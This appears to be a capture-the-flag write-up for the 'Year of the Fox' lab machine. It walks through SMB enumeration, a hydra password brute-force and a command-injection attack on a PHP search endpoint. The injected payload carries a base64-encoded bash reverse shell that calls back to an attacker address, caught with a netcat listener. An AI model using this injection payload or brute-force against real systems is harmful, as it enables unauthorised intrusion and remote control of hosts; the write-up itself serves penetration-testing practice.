# yotf-writeups

"Year of the Fox" - exploit vulnerabilities in a target machine. 
### Reconnaissance

Begin by scanning the target machine to identify open ports and services.
```bash
nmap -A -T4 10.10.245.124
```

**Output:**
```
Nmap scan report for 10.10.245.124
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX
```

The scan reveals:
- **Port 80**: Apache HTTP server requiring basic authentication.
- **Ports 139 and 445**: Samba services running.

### Enumerating Samba Shares

Use `enum4linux` to enumerate information from the Samba service.

```bash
enum4linux 10.10.245.124
```

**Output:**
```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Oct  9 11:04:01 2020

Target ........... 10.10.245.124
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

Enumerating Workgroup/Domain on 10.10.245.124
[+] Got domain/workgroup name: YEAROFTHEFOX

Nbtstat Information for 10.10.245.124
Looking up status of 10.10.245.124
        YEAR-OF-THE-FOX <00> -         B <ACTIVE>  Workstation Service
        YEAR-OF-THE-FOX <03> -         B <ACTIVE>  Messenger Service
        YEAR-OF-THE-FOX <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        YEAROFTHEFOX    <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        YEAROFTHEFOX    <1d> -         B <ACTIVE>  Master Browser
        YEAROFTHEFOX    <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

Session Check on 10.10.245.124
[+] Server 10.10.245.124 allows sessions using username '', password ''

Getting domain SID for 10.10.245.124
Domain Name: YEAROFTHEFOX
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

OS information on 10.10.245.124
[+] Got OS info for 10.10.245.124 from smbclient:
[+] Got OS info for 10.10.245.124 from srvinfo:
        YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

Users on 10.10.245.124
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox      Name: fox       Desc:

user:[fox] rid:[0x3e8]

Share Enumeration on 10.10.245.124
        Sharename       Type      Comment
        ---------       ----      -------
        yotf            Disk      Fox's Stuff -- keep out!
        IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

Attempting to map shares on 10.10.245.124
//10.10.245.124/yotf    Mapping: DENIED, Listing: N/A
//10.10.245.124/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
```

Key findings:
- **User**: `fox`
- **Share**: `yotf` (access denied)

### Accessing the Samba Share

Attempt to access the `yotf` share using the identified username.

```bash
smbclient //10.10.245.124/yotf -U fox
```

**Output:**
```
Enter WORKGROUP\fox's password:
Try "help" to get a list of possible commands.
smb: \>
```

Successfully accessed the share.

### Listing Files in the Share

List the contents of the `yotf` share.

```bash
smb: \> ls
```

**Output:**
```
  .                                   D        0  Sat Oct  3 14:20:17 2020
  ..                                  D        0  Sat Oct  3 14:20:17 2020
  flag.txt                            N       32  Sat Oct  3 14:20:17 2020
```

Found `flag.txt`.

### Retrieving the First Flag

Download the `flag.txt` file.

```bash
smb: \> get flag.txt
```

**Output:**
```
getting file \flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```


---

### Initial Enumeration with `enum4linux`
- **Command:** `enum4linux -a 10.10.245.124`
  - `enum4linux` was used to enumerate information about users and groups on the target SMB server.
  - Output revealed the following users:
    - `fox`
    - `rascal`
  - Discovered shared resources and SID enumeration for further investigation.


### Brute-forcing Login Credentials
- Target user: `rascal`
- **Command:** `hydra -l rascal -P rockyou.txt 10.10.245.124 http-head /`
  - Hydra brute-forced the HTTP login with the `rascal` username using the `rockyou.txt` password list.
  - Discovered password: **`080889`**


### Web Login and Authentication
- Credentials (`rascal:080889`) were used to authenticate on the target web application.
- Exploitation of a vulnerable PHP endpoint (`/assets/php/search.php`) was attempted.


### Reverse Shell Exploitation
- Exploited a command injection vulnerability by sending payloads to the PHP endpoint.
- Initial payload attempted to execute commands, e.g.:
  ```json
  {"target":"\";ls -la\n"}
  ```
- Modified payload to establish a reverse shell:
  ```json
  {"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjgxLjYyLzEyMzQgMD4mMQo= | base64 -d | bash \n"}
  ```
  - **Explanation:**
    - The base64-encoded payload was decoded and executed via `bash` to spawn a reverse shell.


### Setting Up Listener for Reverse Shell
- **Command:** `nc -nvlp 1234`
  - Set up a listener on the attacker's machine using Netcat.

- When the payload executed, the reverse shell connected back:
  ```bash
  connect to [10.9.81.62] from (UNKNOWN) [10.10.245.124] 58138
  ```


### Navigating the Server
- The reverse shell provided access as the `www-data` user.
- Commands executed:
  ```bash
  cd /var/www
  ls
  cat web-flag.txt
  ```
  - Retrieved the web flag: **`THM{Nzg2ZWQw*************************}`**


### Exploring Further (Post Flag Retrieval)
- Additional enumeration:
  - Found encoded credentials in `creds2.txt`:
    ```plaintext
    LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAXUTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
    ```
  - Checked for active connections using `netstat -ano`.
  - Attempted to use `socat` for further pivoting but it was not installed on the system.

> This walkthrough highlights the steps taken to achieve initial access, escalate to a reverse shell, and retrieve the flag effectively.
